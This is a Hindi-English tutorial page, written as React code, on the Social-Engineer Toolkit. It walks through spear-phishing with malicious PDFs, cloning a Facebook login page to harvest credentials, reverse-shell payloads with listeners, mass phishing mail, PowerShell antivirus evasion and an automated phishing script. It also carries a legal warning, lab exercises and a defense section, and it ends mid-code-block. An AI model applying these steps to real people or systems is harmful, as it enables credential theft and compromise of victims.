import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Setoolkit() {
  return (
    <TutorialLayout
      title="setoolkit"
      subtitle="Social-Engineer Toolkit — फिशिंग और सोशल इंजीनियरिंग अटैक फ्रेमवर्क"
      icon="🎭"
      prev={{ to: '/tool/wireshark', label: 'wireshark' }}
      next={{ to: '/tool/responder', label: 'responder' }}
    >
      <h2>What is SET?</h2>
      <p>
        Social-Engineer Toolkit (SET) दुनिया का सबसे पॉपुलर सोशल इंजीनियरिंग फ्रेमवर्क है। यह पेनेट्रेशन टेस्टर्स और रेड टीम ऑपरेटर्स के लिए बनाया गया है जो मानवीय कमज़ोरियों का परीक्षण करना चाहते हैं। फिशिंग अटैक्स, क्रेडेंशियल हार्वेस्टिंग, वेबसाइट क्लोनिंग, पेलोड जनरेशन, मास मेलर — सब एक ही टूल में।
      </p>
      <p>
        SET को David Kennedy ने बनाया है जो TrustedSec के founder हैं और Pentagon के लिए सिक्योरिटी कंसल्टिंग कर चुके हैं। यह टूल Python में लिखा गया है और Metasploit Framework के साथ इंटीग्रेटेड है। SET ने सोशल इंजीनियरिंग टेस्टिंग को ऑटोमेट कर दिया — पहले जो काम घंटों में होता था, अब मिनटों में हो जाता है।
      </p>
      <p>
        सोशल इंजीनियरिंग साइबर सिक्योरिटी में सबसे खतरनाक अटैक वेक्टर है। तकनीकी सुरक्षा कितनी भी मज़बूत हो, अगर इंसान गलती कर दे तो सब बेकार। SET इसी कमज़ोरी को टेस्ट करता है — क्या कर्मचारी फिशिंग ईमेल पर क्लिक करेंगे? क्या वो नकली वेबसाइट पर पासवर्ड डाल देंगे? क्या वो अनजान USB प्लग करेंगे? यह सब SET से टेस्ट किया जा सकता है।
      </p>
      <p>
        SET में कई अटैक वेक्टर्स हैं — स्पीयर फिशिंग, वेबसाइट अटैक्स, इंफेक्शन मीडिया, पेलोड जनरेशन, मास मेलर, Arduino अटैक्स, वायरलेस AP अटैक्स, QR कोड अटैक्स, और PowerShell अटैक्स। हर अटैक वेक्टर के अंदर कई सब-ऑप्शंस हैं। यह टूल Red Team Operations में बहुत ज़रूरी है।
      </p>
      <p>
        SET का architecture modular है — हर अटैक अलग module की तरह काम करता है। Spear-Phishing module emails भेजता है, Website Attack module fake pages बनाता है, Payload Generator module malicious files create करता है। Metasploit integration से listeners automatic setup हो जाते हैं। यह टूल Kali Linux, Parrot OS, और BackBox में pre-installed आता है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> SET केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा ऑडिट में ही इस्तेमाल करें। बिना अनुमति के फिशिंग और सोशल इंजीनियरिंग अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत एक्सेस बनाना अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल लिखित अनुमति के साथ ही उपयोग करें।
      </div>

      <h2>History of SET</h2>
      <p>
        SET की शुरुआत 2011 में David Kennedy ने की थी। David TrustedSec कंपनी के founder हैं और वो Pentagon, NSA, और कई Fortune 500 कंपनियों के लिए सिक्योरिटी ऑडिट कर चुके हैं। David ने पहले Metasploit Framework में काम किया था और उसी experience से SET बनाया। SET को बनाने का उद्देश्य था — सोशल इंजीनियरिंग अटैक्स को ऑटोमेट करना ताकि कंपनियां अपने कर्मचारियों की सुरक्षा जांच सकें।
      </p>
      <p>
        2012 में SET को Kali Linux (उस समय BackTrack) में शामिल किया गया। 2013 में इसे TrustedSec ने ओपन सोर्स किया और GitHub पर रिलीज़ किया। आज SET GitHub पर 12,000+ स्टार्स के साथ सबसे पॉपुलर सोशल इंजीनियरिंग टूल है। इसे DEF CON, Black Hat, और RSA conferences में कई बार प्रदर्शित किया गया है।
      </p>
      <p>
        SET का evolution interesting है — शुरू में यह सिर्फ फिशिंग ईमेल भेजने का टूल था। बाद में इसमें website cloning, payload generation, USB attacks, WiFi attacks, और PowerShell attacks जोड़े गए। 2015 में SET 8.0 release हुआ जिसमें massive improvements थे — बेहतर evasion, नए attack vectors, और improved Metasploit integration। David Kennedy regularly updates करते हैं और community contributions भी accept करते हैं।
      </p>
      <p>
        2017 में SET ने PowerShell attack vectors add किए जो memory-based payloads generate करते हैं — यह antivirus evasion में बहुत काम आया। 2019 में QR code attack vector add हुआ जो mobile phishing के लिए है। 2020 में COVID-19 pandemic के दौरान phishing attacks 400% बढ़ गए और SET ने इसमें अहम भूमिका निभाई — security teams ने SET से employees की awareness test की।
      </p>
      <p>
        SET का impact industry पर बहुत बड़ा रहा है। इसने सोशल इंजीनियरिंग testing को mainstream बनाया। पहले companies सिर्फ technical security पर ध्यान देती थीं — firewalls, IDS, encryption। SET ने prove किया कि humans सबसे कमज़ोर कड़ी हैं। आज हर major company phishing simulation programs चलाती है और SET इसका pioneer है। OWASP, NIST, और PCI-DSS standards में social engineering testing को mandatory माना गया है।
      </p>

      <h2>How SET Works?</h2>
      <p>
        SET menu-driven framework है जो various attack vectors provide करता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Social-Engineering Attacks:</strong> Spear-phishing, credential harvesting, website cloning, payload generation, mass mailer</li>
        <li><strong className="text-white">Penetration Testing (Fast-Track):</strong> Automated exploitation — quick and easy compromise</li>
        <li><strong className="text-white">Third Party Modules:</strong> Metasploit integration, Arduino attacks, Android payloads</li>
        <li><strong className="text-white">Payload Generator:</strong> Windows, Linux, Android, macOS के लिए malicious payloads</li>
        <li><strong className="text-white">Email Attacks:</strong> Single email और mass mailer — spear-phishing campaigns</li>
        <li><strong className="text-white">Infectious Media:</strong> USB, QR code, Arduino HID attacks</li>
        <li><strong className="text-white">Website Attacks:</strong> Credential harvesting, tabnapping, Java applet, web jacking</li>
        <li><strong className="text-white">PowerShell Attacks:</strong> Memory-based payloads, reverse shells, injection</li>
      </ul>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर और काली लिनक्स में SET प्री-इंस्टॉल्ड आता है। अगर नहीं है तो आसानी से इंस्टॉल कर सकते हैं।
      </p>
      <CodeBlock
        title="SET Installation"
        code={`# काली लिनक्स/नेटहंटर में:
sudo apt update
sudo apt install set

# Git से (सबसे लेटेस्ट):
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip3 install -r requirements.txt
sudo python3 setup.py install

# वर्जन चेक:
setoolkit --version

# अपडेट:
sudo setoolkit --update

# सहायता:
setoolkit --help`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">मेन्यू ऑप्शन</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उपयोग</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">1) Social-Engineering Attacks</td><td className="py-2 px-3">सभी सोशल इंजीनियरिंग अटैक्स</td><td className="py-2 px-3">फिशिंग, क्रेडेंशियल हार्वेस्टिंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">1→1) Spear-Phishing</td><td className="py-2 px-3">टार्गेटेड फिशिंग ईमेल</td><td className="py-2 px-3">मालिशियस अटैचमेंट के साथ ईमेल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">1→2) Website Attack</td><td className="py-2 px-3">वेबसाइट अटैक वेक्टर्स</td><td className="py-2 px-3">क्रेडेंशियल हार्वेस्टिंग, टैबनैपिंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">1→3) Infectious Media</td><td className="py-2 px-3">USB/मीडिया अटैक</td><td className="py-2 px-3">ऑटोरन पेलोड जनरेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">1→4) Create Payload</td><td className="py-2 px-3">पेलोड और लिस्नर बनाएं</td><td className="py-2 px-3">EXE, HTA, PowerShell payloads</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">1→5) Mass Mailer</td><td className="py-2 px-3">बल्क ईमेल अटैक</td><td className="py-2 px-3">एक साथ कई लोगों को फिशिंग ईमेल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">1→9) PowerShell</td><td className="py-2 px-3">PowerShell अटैक्स</td><td className="py-2 px-3">मेमोरी-बेस्ड पेलोड्स</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">2) Penetration Testing</td><td className="py-2 px-3">फास्ट-ट्रैक एक्सप्लॉइटेशन</td><td className="py-2 px-3">ऑटोमेटेड कम्प्रोमाइज</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">3) Third Party</td><td className="py-2 px-3">बाहरी मॉड्यूल्स</td><td className="py-2 px-3">Arduino, Android, Metasploit</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">4) Update SET</td><td className="py-2 px-3">SET अपडेट करें</td><td className="py-2 px-3">नवीनतम फीचर्स और फिक्सेस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">5) Update Config</td><td className="py-2 px-3">कॉन्फ़िगरेशन रीसेट</td><td className="py-2 px-3">डिफ़ॉल्ट सेटिंग्स रिस्टोर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">set.config</td><td className="py-2 px-3">SET कॉन्फ़िग फाइल</td><td className="py-2 px-3">/etc/setoolkit/set.config</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--version</td><td className="py-2 px-3">वर्जन दिखाएं</td><td className="py-2 px-3">setoolkit --version</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">--update</td><td className="py-2 px-3">अपडेट करें</td><td className="py-2 px-3">sudo setoolkit --update</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--help</td><td className="py-2 px-3">सहायता</td><td className="py-2 px-3">setoolkit --help</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Basic Usage</h2>
      <p>
        SET शुरू करने पर इंटरैक्टिव मेन्यू दिखता है। हर अटैक के लिए स्टेप-बाय-स्टेप प्रॉम्प्ट आते हैं।
      </p>
      <CodeBlock
        title="SET लॉन्च करें"
        code={`# SET शुरू करें:
sudo setoolkit

# मेन्यू दिखेगा:
# 1) Social-Engineering Attacks
# 2) Penetration Testing (Fast-Track)
# 3) Third Party Modules
# 4) Update the Social-Engineer Toolkit
# 5) Update SET configuration
# 6) Help, Credits, and About

# Social-Engineering Attacks सेलेक्ट करें (1):
# 1) Spear-Phishing Attack Vectors
# 2) Website Attack Vectors
# 3) Infectious Media Generator
# 4) Create a Payload and Listener
# 5) Mass Mailer Attack
# 6) Arduino-Based Attack Vector
# 7) Wireless Access Point Attack
# 8) QRCode Generator Attack Vector
# 9) Powershell Attack Vectors
# 10) Third Party Modules`}
      />

      <h2>Spear-Phishing Attack</h2>
      <p>
        स्पीयर फिशिंग में टार्गेटेड फिशिंग ईमेल भेजे जाते हैं। SET ऑटोमैटिकली मालिशियस अटैचमेंट बनाता है और ईमेल भेजता है।
      </p>
      <CodeBlock
        title="स्पीयर फिशिंग अटैक"
        code={`# SET मेन्यू से:
# 1) Social-Engineering Attacks
# 1) Spear-Phishing Attack Vectors
# 1) Perform a Mass Email Attack

# पेलोड चुनें:
# 1) SET Custom Written DLL Hijacking
# 2) SET Custom Written HTA
# 17) Microsoft Word RTF (MS12-027)
# 18) Adobe PDF Embedded EXE

# उदाहरण — PDF अटैचमेंट:
# 18) Adobe PDF Embedded EXE सेलेक्ट करें
# Listener IP डालें (अपना IP)
# Listener Port डालें (443)

# ईमेल कॉन्फ़िगर करें:
# SMTP सर्वर: smtp.gmail.com
# ईमेल एड्रेस और पासवर्ड
# टार्गेट ईमेल लिस्ट

# SET ऑटोमैटिकली भेज देगा!`}
      />

      <h2>Credential Harvesting</h2>
      <p>
        यह SET का सबसे पॉपुलर अटैक है। रियल वेबसाइट का क्लोन बनाकर क्रेडेंशियल्स कैप्चर किए जाते हैं।
      </p>
      <CodeBlock
        title="क्रेडेंशियल हार्वेस्टिंग"
        code={`# SET मेन्यू से:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack
# 2) Site Cloner

# अपना IP डालें (Nethunter का IP):
# उदाहरण: 192.168.1.10

# क्लोन करने वाली वेबसाइट का URL:
# उदाहरण: https://facebook.com

# SET क्लोन बनाएगा और सर्वर शुरू करेगा:
# [*] Starting server on 192.168.1.10:80
# [*] Cloning website: https://facebook.com
# [*] Credential harvester started!

# जब विक्टिम लॉगिन करेगा:
# [*] WE GOT A HIT! Printing results:
# USERNAME: victim@email.com
# PASSWORD: mypassword123`}
      />

      <h2>Website Attack Vectors</h2>
      <p>
        SET के website attack vectors बहुत powerful हैं — multiple techniques से credentials और sessions capture होते हैं।
      </p>
      <CodeBlock
        title="वेबसाइट अटैक ऑप्शंस"
        code={`# SET मेन्यू से:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors

# Website Attack Options:
# 1) Java Applet Attack Method
# 2) Metasploit Browser Exploit
# 3) Credential Harvester Attack
# 4) Tabnabbing Attack
# 5) Web Jacking Attack
# 6) Multi-Attack Web Vector
# 7) HTA Attack Method

# Credential Harvester (सबसे पॉपुलर):
# 1) Web Templates (SET के बिल्ट-इन टेम्पलेट्स)
# 2) Site Cloner (किसी भी वेबसाइट का क्लोन)
# 3) Custom Import (अपनी HTML फाइल)

# Tabnabbing:
# विक्टिम जब टैब स्विच करता है
# तो पेज क्लोन में बदल जाता है

# Web Jacking:
# URL spoofing करके विक्टिम को redirect करता है

# Multi-Attack:
# कई अटैक्स एक साथ combine करता है`}
      />

      <h2>Payload Generation</h2>
      <p>
        SET से various formats में payloads generate किए जा सकते हैं।
      </p>
      <CodeBlock
        title="पेलोड जनरेशन"
        code={`# SET मेन्यू से:
# 1) Social-Engineering Attacks
# 4) Create a Payload and Listener

# Payload Options:
# 1) Windows Reverse TCP (Meterpreter)
# 2) Windows Reverse TCP (Staged)
# 3) Windows Reverse HTTPS (Meterpreter)
# 4) Windows Bind Shell (Meterpreter)
# 5) Windows Shellcode (Stageless)
# 6) Linux Reverse TCP (Meterpreter)
# 7) Android Reverse TCP (Meterpreter)

# उदाहरण — Windows EXE पेलोड:
# 1) Windows Reverse TCP सेलेक्ट करें
# LHOST: 192.168.1.10 (अपना IP)
# LPORT: 4444

# पेलोड generate होगा:
# /root/.set/payload.exe

# Listener automatic start होगा:
# [*] Starting listener on port 4444
# [*] Waiting for connection...`}
      />

      <h2>Mass Mailer Attack</h2>
      <p>
        एक साथ कई लोगों को फिशिंग ईमेल भेजने के लिए Mass Mailer use करें।
      </p>
      <CodeBlock
        title="मास मेलर"
        code={`# SET मेन्यू से:
# 1) Social-Engineering Attacks
# 5) Mass Mailer Attack

# Mass Mailer Options:
# 1) E-Mail Attack Single Email Address
# 2) E-Mail Attack Mass Mailer

# Single Email:
# Target email: victim@company.com
# Subject: Important Security Update
# Body: Please review the attached document...

# Mass Mailer:
# Email list file: /path/to/emails.txt
# SET bulk emails भेजेगा malicious attachment के साथ

# Gmail SMTP use कर सकते हो (app password चाहिए):
# SMTP server: smtp.gmail.com
# Port: 587
# Username: your@gmail.com
# Password: app_password`}
      />

      <h2>PowerShell Attack Vectors</h2>
      <p>
        PowerShell attacks memory-based होते हैं — disk पर file नहीं बनती, antivirus detect नहीं कर पाता।
      </p>
      <CodeBlock
        title="PowerShell अटैक्स"
        code={`# SET मेन्यू से:
# 1) Social-Engineering Attacks
# 9) Powershell Attack Vectors

# PowerShell Options:
# 1) Powershell Alphanumeric Shellcode Injector
# 2) Powershell Reverse Shell
# 3) Powershell Bind Shell
# 4) Powershell Dump Password Hashes

# PowerShell Reverse Shell:
# LHOST: 192.168.1.10
# LPORT: 4444

# Output: powershell_command.txt
# इस command को victim की machine पर run कराओ

# AV evasion advantage:
# Powershell memory में run होता है
# Disk पर file नहीं बनती
# Antivirus detect नहीं कर पाता`}
      />

      <h2>Scripting and Automation</h2>
      <p>
        SET को scripts से automate कर सकते हो — automated phishing campaigns के लिए।
      </p>
      <CodeBlock
        title="Automated Phishing Script"
        code={`#!/bin/bash
# SET automated phishing script

TARGET_LIST="/path/to/targets.txt"
ATTACKER_IP="192.168.1.10"
PHISH_URL="https://facebook.com"

# Step 1: Credential harvesting page start करो
echo "[*] Starting credential harvester..."
expect -c "
spawn setoolkit
expect \"set>:\"
send \"1\r\"
expect \"set>:\"
send \"2\r\"
expect \"set>:\"
send \"3\r\"
expect \"set>:\"
send \"2\r\"
expect \"set>:\"
send \"$ATTACKER_IP\r\"
expect \"set>:\"
send \"$PHISH_URL\r\"
expect eof
" &

# Step 2: Wait for page to load
sleep 10

# Step 3: Phishing email भेजो
echo "[*] Sending phishing emails..."
while IFS= read -r email; do
    echo "[+] Sending to: $email"
    # Email sending logic here
done < "$TARGET_LIST"

echo "[*] Attack launched. Check for captured credentials."`}
      />

      <h2>SET Configuration</h2>
      <p>
        SET की configuration file modify करके default behavior change कर सकते हो।
      </p>
      <CodeBlock
        title="SET Configuration"
        code={`# Config file location:
sudo nano /etc/setoolkit/set.config

# Important settings:

# Metasploit path:
METASPLOIT_PATH=/usr/share/metasploit-framework

# Email settings:
EMAIL_PROVIDER=gmail
EMAIL_USERNAME=your@gmail.com
EMAIL_PASSWORD=your_app_password

# Listener settings:
AUTO_LISTENER=true
LISTENER_PORT=4444

# Web server settings:
APACHE_SERVER=OFF
WEB_PORT=80

# Payload settings:
PAYLOAD_TYPE=reverse_tcp
ENCODE_PAYLOAD=true
ENCODE_TYPE=shikata_ga_nai

# Config file के बाद SET restart करें:
sudo setoolkit`}
      />

      <h2>SET vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">SET</th>
              <th className="text-left py-2 px-3 text-neon-green">GoPhish</th>
              <th className="text-left py-2 px-3 text-neon-green">King Phisher</th>
              <th className="text-left py-2 px-3 text-neon-green">SocialFish</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">इंटरफ़ेस</td><td className="py-2 px-3">CLI Menu</td><td className="py-2 px-3">Web GUI</td><td className="py-2 px-3">Web GUI</td><td className="py-2 px-3">Web GUI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">फिशिंग</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ (best)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">क्रेडेंशियल हार्वेस्ट</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">पेलोड जनरेशन</td><td className="py-2 px-3">हाँ (Metasploit)</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">ट्रैकिंग</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">Advanced</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">बेसिक</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">USB अटैक्स</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WiFi अटैक्स</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Metasploit</td><td className="py-2 px-3">Integrated</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">Medium</td><td className="py-2 px-3">Easy (GUI)</td><td className="py-2 px-3">Easy (GUI)</td><td className="py-2 px-3">Easy (GUI)</td></tr>
            <tr><td className="py-2 px-3 text-white">कीमत</td><td className="py-2 px-3">Free</td><td className="py-2 px-3">Free</td><td className="py-2 px-3">Free</td><td className="py-2 px-3">Free</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'SET start नहीं हो रहा', a: 'sudo से run करो — root privileges चाहिए। Python dependencies check करो: pip3 install -r requirements.txt' },
          { q: 'Credential Harvester page load नहीं हो रहा', a: 'Firewall port 80 open करो। Apache/NGINX stop करो जो port 80 use कर रहा हो। set.config में APACHE_SERVER=OFF करो।' },
          { q: 'Emails send नहीं हो रहे', a: 'SMTP settings check करो। Gmail app password use करो (normal password नहीं)। Port 587/465 block न हो।' },
          { q: 'Payload detect हो रहा है', a: 'AV evasion options use करो (option 4 — Meterpreter HTTPS)। Custom encoder try करो। Powershell payloads use करो — memory-based होते हैं।' },
          { q: 'Website clone सही नहीं बन रहा', a: 'JavaScript-heavy sites properly clone नहीं होते। Simple login pages use करो। Custom HTML template import करो।' },
          { q: 'Metasploit integration काम नहीं कर रहा', a: 'Metasploit correctly install होना चाहिए। msfconsole manually run करके check करो। /etc/setoolkit/set.config में METASPLOIT_PATH सही होना चाहिए।' },
          { q: 'Java Applet attack काम नहीं कर रहा', a: 'Java applets modern browsers में support नहीं होते। HTA attack या PowerShell attack use करो instead।' },
          { q: 'Listener connection नहीं आ रहा', a: 'Firewall check करो — port 4444 open होना चाहिए। NAT/port forwarding setup करो अगर remote network पर हो। LHOST सही IP होना चाहिए।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        SET attacks से कैसे बचें — defensive perspective:
      </p>
      <p>
        सोशल इंजीनियरिंग attacks को detect करना technical attacks से ज़्यादा मुश्किल है क्योंकि यह human behavior exploit करते हैं। Traditional security tools (firewall, IDS) इन्हें नहीं रोक पाते। इसलिए multi-layered defense strategy ज़रूरी है — technical controls + human training दोनों।
      </p>
      <p>
        <strong className="text-white">Email Authentication:</strong> SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), और DMARC (Domain-based Message Authentication) configure करो। यह spoofed emails को block करता है। Gmail, Outlook, और corporate email servers सब support करते हैं। DMARC policy set करो — "reject" mode use करो "none" की जगह।
      </p>
      <p>
        <strong className="text-white">Security Awareness Training:</strong> Employees को regular phishing training दो। Simulated phishing campaigns चलाओ — GoPhish या KnowBe4 use करो। Training frequency बढ़ाओ — monthly tests best हैं। जो employees fail करें उन्हें extra training दो। Gamification use करो — leaderboards, rewards, competitions।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Email Security:</strong> SPF, DKIM, DMARC configure करें — spoofed emails block होंगे</li>
        <li><strong className="text-white">Security Awareness Training:</strong> Employees को phishing training दें — simulated attacks से practice कराएं</li>
        <li><strong className="text-white">Multi-Factor Authentication:</strong> MFA enable करें — credentials leak होने पर भी safe</li>
        <li><strong className="text-white">Web Filtering:</strong> Suspicious domains और URLs block करें — proxy/firewall rules</li>
        <li><strong className="text-white">Endpoint Protection:</strong> Advanced AV/EDR solutions use करें — behavioral detection</li>
        <li><strong className="text-white">URL Inspection:</strong> Links click करने से पहले verify करें — hover करके real URL देखें</li>
        <li><strong className="text-white">Email Attachment Scanning:</strong> Sandboxing technology use करें — attachments detonate करो before delivery</li>
        <li><strong className="text-white">DNS Filtering:</strong> Malicious domains block करें — Pi-hole, Cisco Umbrella</li>
        <li><strong className="text-white">Phishing Simulation:</strong> Regular phishing tests conduct करें — weak employees identify करें</li>
        <li><strong className="text-white">Incident Response Plan:</strong> Phishing incident होने पर क्या करना है — यह plan ready रखें</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        SET practice के लिए safe lab बनाना ज़रूरी है — real networks पर कभी test न करें। Lab setup करने के लिए minimum 8GB RAM वाली machine चाहिए। VirtualBox ya VMware use करो — isolated network environment बनाओ जो internet से disconnected हो।
      </p>
      <p>
        Lab architecture simple रखो — attacker machine (Kali Linux), victim machine (Windows 10), और optional web server (Ubuntu)। Network adapter Host-Only mode पर set करो ताकि traffic isolated रहे। Snapshot लेते रहो — अगर कुछ गड़बड़ हो तो restore कर सको।
      </p>
      <CodeBlock
        title="Lab Setup"
        code={`# VirtualBox/VMware में lab बनाएं:
# VM 1: Kali Linux (attacker — SET)
# VM 2: Windows 10 (victim)
# VM 3: Ubuntu (target web server)

# Network: Host-Only Adapter use करें
# ताकि isolated network रहे

# SET install करें (Kali में pre-installed):
sudo apt update
sudo apt install set

# Practice exercises:
# 1. Credential Harvesting — Facebook clone
# 2. Spear-Phishing — PDF attachment
# 3. Payload Generation — Windows EXE
# 4. Mass Mailer — bulk emails
# 5. PowerShell Attack — memory payload

# सुरक्षा नियम:
# - केवल अपने lab में test करें
# - Real targets पर कभी use न करें
# - Written authorization के बिना कभी नहीं`}
      />
      <CodeBlock
        title="Lab Network Configuration"
        code={`# VirtualBox Host-Only Network Setup:
# File → Host Network Manager → Create
# IP: 192.168.56.1/24

# Kali VM settings:
# Network Adapter 1: Host-Only (192.168.56.10)
# Network Adapter 2: NAT (internet access)

# Windows VM settings:
# Network Adapter 1: Host-Only (192.168.56.20)

# Ubuntu Server:
# Network Adapter 1: Host-Only (192.168.56.30)

# Connectivity test:
ping 192.168.56.20  # Kali से Windows
ping 192.168.56.30  # Kali से Ubuntu

# Email server setup (local):
sudo apt install postfix
# Local mail delivery configure करो
# SET emails इसी server से भेजेगा

# Snapshot management:
# VBoxManage snapshot "Kali" take "clean-install"
# VBoxManage snapshot "Kali" restore "clean-install"`}
      />
      <CodeBlock
        title="Practice Exercise Guide"
        code={`# Exercise 1: Basic Credential Harvesting
# Difficulty: Easy
# Goal: Facebook login page clone करो
# Steps: SET → 1→2→3→2 → IP → URL
# Verify: Browser में page open करो
# Expected: Fake Facebook page दिखेगा
# Success: credentials capture होंगे

# Exercise 2: Spear-Phishing with PDF
# Difficulty: Medium
# Goal: PDF attachment से meterpreter session
# Steps: SET → 1→1→1 → PDF payload → email
# Verify: Meterpreter session check करो
# Expected: Windows VM पर PDF open करने पर session आएगा
# Success: meterpreter> prompt दिखेगा

# Exercise 3: USB Drop Attack
# Difficulty: Medium
# Goal: USB payload generate करो
# Steps: SET → 1→3 → Windows payload
# Verify: USB plug करने पर payload execute हो
# Expected: HID keyboard injection होगा
# Success: Command prompt open होगा

# Exercise 4: Mass Mailer Campaign
# Difficulty: Hard
# Goal: Multiple targets को phishing भेजो
# Steps: Email list बनाओ → SET → 1→5
# Verify: Delivery reports check करो
# Expected: Postfix logs में delivery status
# Success: सभी emails deliver होंगे

# Exercise 5: Multi-Attack Vector
# Difficulty: Expert
# Goal: कई attacks combine करो
# Steps: SET → 1→2→6 → Multiple vectors select
# Verify: सभी vectors independently काम करें
# Expected: Java, browser, credential harvester सब एक साथ
# Success: Multiple attack surfaces available

# Exercise 6: QR Code Phishing
# Difficulty: Medium
# Goal: QR code से credential harvesting
# Steps: SET → 1→8 → Credential harvester URL
# Verify: QR code scan करने पर fake page खुले
# Expected: Mobile browser में phishing page
# Success: Mobile device से credentials capture

# Exercise 7: PowerShell Attack
# Difficulty: Hard
# Goal: Memory-based payload (disk-less)
# Steps: SET → 1→4→9 → PowerShell injection
# Verify: PowerShell session establish हो
# Expected: No file on disk, memory में payload
# Success: powershell> prompt दिखेगा

# Exercise 8: Custom Template Phishing
# Difficulty: Expert
# Goal: Company-specific phishing page बनाओ
# Steps: Website clone → Custom modify → Host
# Verify: Custom page properly render हो
# Expected: Company branding के साथ phishing page
# Success: Realistic-looking page ready`}
      />

      <h2>Advanced Techniques</h2>
      <p>
        Advanced SET techniques for red team operations:
      </p>
      <CodeBlock
        title="एडवांस्ड टेक्निक्स"
        code={`# 1. Custom Payload with Encryption:
# set.config में ENCODE_PAYLOAD=true करें
# ENCODE_TYPE=shikata_ga_nai (multiple rounds)

# 2. HTA Attack (HTML Application):
# Modern browsers support करते हैं
# 1→2→7 (HTA Attack Method)
# JavaScript + VBScript combination

# 3. Custom Email Templates:
# /etc/setoolkit/src/templates/ में templates edit करें
# Company-specific templates बनाएं

# 4. Multi-Attack Vector:
# 1→2→6 (Multi-Attack Web Vector)
# कई अटैक्स एक साथ combine करें

# 5. USB Rubber Ducky:
# 1→3 (Infectious Media Generator)
# HID attack — keyboard injection

# 6. QR Code Attack:
# 1→8 (QRCode Generator Attack Vector)
# QR code में malicious URL embed करें

# 7. Arduino Attack:
# 1→6 (Arduino-Based Attack Vector)
# Hardware-based HID attack

# 8. WiFi AP Attack:
# 1→7 (Wireless Access Point Attack)
# Rogue access point बनाकर traffic intercept`}
      />
      <CodeBlock
        title="Custom Payload Generation with Encoding"
        code={`# Multi-encoded payload (AV bypass):
sudo setoolkit
# 1) Social-Engineering Attacks
